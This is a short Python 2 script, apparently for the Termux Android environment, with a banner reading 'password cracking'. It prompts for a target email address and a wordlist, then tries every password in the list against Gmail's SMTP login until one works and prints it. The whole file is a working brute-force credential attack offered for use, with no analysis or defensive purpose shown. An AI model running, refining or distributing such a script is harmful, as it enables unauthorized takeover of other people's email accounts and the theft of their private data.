import smtplib
import os,sys

os.system ("termux-setup-storage")
os.system ("figlet Hyperware | lolcat")
print "      " 
print "              BY : defalt      "
print "          password cracking    "
smtpserver = smtplib.SMTP("smtp.gmail.com" , 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter Email : ")
passF = raw_input("Enter Wordlist : ")
passF = open(passF, "r")

for password in passF:

        try:

                smtpserver.login(user, password)
                print ("Password : %s" % password)
                break;

        except smtplib.SMTPAuthenticationError:
                print("not found")
